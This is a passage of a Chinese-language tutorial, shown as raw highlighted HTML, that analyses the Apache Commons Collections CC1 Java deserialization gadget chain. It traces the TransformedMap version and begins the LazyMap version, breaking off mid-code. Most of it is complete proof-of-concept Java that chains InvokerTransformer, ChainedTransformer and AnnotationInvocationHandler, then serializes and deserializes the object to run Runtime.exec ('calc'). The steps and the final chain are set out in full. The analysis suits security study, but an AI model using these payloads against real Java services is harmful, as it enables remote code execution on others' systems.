class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但目前还不能成功利用，有三个问题需解决：</p><ol><li><code>Runtime</code> 对象不可序列化，需要通过反射将其变成可以序列化的形式</li></ol><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807517.png"></p><p>反射解决：</p><p>先写普通反射：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);  <br><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> (Runtime) method.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);  <br><span class="hljs-type">Method</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br>run.invoke(runtime, <span class="hljs-string">&quot;calc&quot;</span>); <br></code></pre></td></tr></table></figure><p>然后改为 <code>InvokerTransformer</code> 调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> (Method) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;<br>        ).transform(Runtime.class);<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;<br>        ).transform(m);<br><br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        ).transform(r);<br></code></pre></td></tr></table></figure><p>由于一个一个调用 transform 太繁琐，我们使用 ChainedTransformer 类进行简化：</p><p><code>ChainedTransformer</code> 类下的 <code>transform</code> 方法递归调用了前一个方法的结果，作为后一个方法的参数</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807331.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>                )<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br><br>        Class&lt;Runtime&gt; runtimeClass = Runtime.class;<br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Override.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这样就解决了第一个问题。</p><ol start="2"><li><code>AnnotationInvocationHandler</code>类中的判断条件</li></ol><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807064.png"></p><p>通过调试发现，<font style="color:#080808;background-color:#ffffff;">memberType &#x3D; null 所以不进入 if 判断，无法调用 setValue</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807064.png"></p><p><font style="color:#080808;background-color:#ffffff;">memberType 是获取注解中成员变量的名称</font>，然后并且检查键值对中键名是否有对应的名称，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807650.png"></p><p>点进 <font style="color:#080808;background-color:#ffffff;">Override，我们所使用的注解是没有成员变量的</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807700.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509011720823.png"></p><p>而点进 <font style="color:#080808;background-color:#ffffff;">Target 发现其符合我们的需求</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311807151.png"></p><p>修改POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">//修改参数</span><br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br><br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">//改传参注解为：Target</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>这时 <font style="color:#080808;background-color:#ffffff;">memberType 已经不为空了。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808790.png"></p><ol start="3"><li><code>setValue</code> 传参固定</li></ol><p>继续跟进时，发现<code>setValue</code> 传入的值不是 Runtime.class ，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808526.png"></p><p>这里就需要 <code>ConstantTransformer</code> 类，<code>ConstantTransformer</code> 方法将传入的对象放入 <code>iConstant</code>中，<code>transform()</code> 方法无论传入什么，都返回 <code>iConstant</code>，完美符合要求。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808248.png"></p><p>修改POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//添加：</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>                )<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-4-最终-POC-："><a href="#1-4-最终-POC-：" class="headerlink" title="1.4 最终 POC ："></a>1.4 最终 POC ：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808016.png"></p><h3 id="1-5-总结"><a href="#1-5-总结" class="headerlink" title="1.5 总结"></a>1.5 总结</h3><p><code>transform</code> 方法，可以把一个对象转换成另一个对象， 但是，在实现类里把 <code>transform</code> 变成“可以执行任意逻辑”时，就出现了漏洞。我们发现 <code>InvokerTransformer</code> 实现了 <code>Transformer</code> 接口并且有 <code>transform</code> 方法，</p><p>接着找到 <code>TransformedMap</code> 类中的 <code>checkSetValue</code> 方法调用了 <code>transform</code> 方法；</p><p>之后找到 <code>AbstractInputCheckedMapDecorator</code> 类中的 <code>setValue</code> 方法调用了 <code>checkSetValue</code>方法，</p><p>通过测试这条链是没问题的，那么接下来的目标就是寻找一个入口点 ，查找哪个方法调用了 <code>setValue</code> ，最好是重写的 <code>readObject</code>，通过 <code>readObject</code> 来触发漏洞。</p><p>找到 <code>AnnotationInvocationHandler</code> 类中的 <code>readObject</code> 方法存在 <code>setValue</code>，需要注意的是 <code>readObject</code> 不是直接调用 ·，</p><p><code>readObject</code> 方法在反序列化时，会从序列化数据中恢复 <code>memberValues</code>（一个 <code>Map</code>），而这个 <code>Map</code> 的内容完全取决于攻击者传入的序列化流。攻击者可以在这里替换成 <code>TransformedMap</code>，从而把恶意 <code>Transformer</code> 链接进来。</p><p>通过对 <code>readObject</code> 的调试，知道了 <code>readObject</code> 如何触发 <code>setValue</code> ：</p><p>在反序列化时，<code>AnnotationInvocationHandler.readObject</code> 会去恢复 <code>memberValues</code> 里的数据。它遍历 <code>memberValues.entrySet()</code> 时，取到的 <code>MapEntry</code> 会调用 <code>setValue</code> 来写入值。也就是说：反序列化时，<code>readObject</code> 间接触发了 <code>MapEntry.setValue</code>。 </p><p><strong>完整的利用链思路：</strong></p><p> AnnotationInvocationHandler.readObject</p><p>memberValue.setValue</p><p>MapEntry.setValue</p><p>parent.checkSetValue</p><p>TransformedMap.checkSetValue</p><p>valueTransform.transform</p><p>ChainedTransformer.transform</p><p>ConstantTransformer.transform</p><p>InvokerTransformer.transform  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808194.png"></p><p><code>readObject</code> 在反序列化时会恢复 <code>memberValues</code>（一个 <code>Map</code>）,</p><p>由于攻击者可控，这个 <code>Map</code> 可以被替换为 <code>TransformedMap</code>，</p><p>当 <code>readObject</code> 遍历 <code>memberValues.entrySet()</code> 时，会触发 <code>MapEntry.setValue</code>，</p><p><code>setValue</code> 会调用 <code>checkSetValue</code>，而 <code>checkSetValue</code> 又会调用 <code>valueTransform.transform</code>，</p><p>这里的 <code>valueTransform</code> 实际上是 <code>ChainedTransformer</code>，它会依次执行其中的 <code>ConstantTransformer</code> 和 <code>InvokerTransformer</code>，</p><p>最终 <code>InvokerTransformer.transform</code> 会调用任意方法，从而实现代码执行。</p><h2 id="2、-LazyMap-版"><a href="#2、-LazyMap-版" class="headerlink" title="2、 LazyMap 版"></a>2、 LazyMap 版</h2><h3 id="2-1-分析利用链"><a href="#2-1-分析利用链" class="headerlink" title="2.1 分析利用链"></a>2.1 分析利用链</h3><p>首先找到 LazyMap 类中的 get 方法中有 <font style="color:#080808;background-color:#ffffff;">transform 方法。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808665.png"></p><p>找 factory ：<font style="color:#080808;background-color:#ffffff;">Transformer</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808064.png"></p><p>由于此处的构造方法同样为 protected ，还是利用静态方法 decorate 传参</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808653.png"></p><p>继续找谁调用了 LayMap.get() </p><p>在 <font style="color:#080808;background-color:#ffffff;">AnnotationInvocationHandler 类中的 invoke 方法调用了 get</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808079.png"></p><p>同时这个类也有 TransformedMap 中用到的 readObject 方法 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311809084.png"></p><p><font style="color:rgb(44, 62, 80);">要触发 AnnotationInvocationHander.invoke，用到动态代理</font></p><h3 id="2-2-编写-EXP"><a href="#2-2-编写-EXP" class="headerlink" title="2.2 编写 EXP"></a>2.2 编写 EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 